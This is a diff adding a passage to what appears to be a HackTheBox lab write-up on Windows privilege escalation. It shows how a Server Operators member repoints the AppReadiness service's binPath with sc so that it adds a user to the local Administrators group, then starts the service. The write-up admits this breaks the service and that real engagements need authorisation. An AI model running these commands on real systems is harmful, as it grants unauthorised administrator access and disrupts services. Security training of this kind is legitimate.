@@ -204,4 +204,20 @@ DISPLAY_NAME: App Readiness
                 All
 ```
 
-It is confirmed that Server Operators have A
+It is confirmed that Server Operators have All permission over it, next we can use sc to modify it's binpath so that it would execute our command:
+```
+C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+
+Then, we use sc to start service:
+```
+C:\htb> sc start AppReadiness
+
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+```
+
+Notice that we kinda just screwed this service as we modified it's binPath, in actual engagement environment we need to confirm if it is okay for us to carry out this attack
+
+The service is screwed, however the command payload we added to it indeed got executed
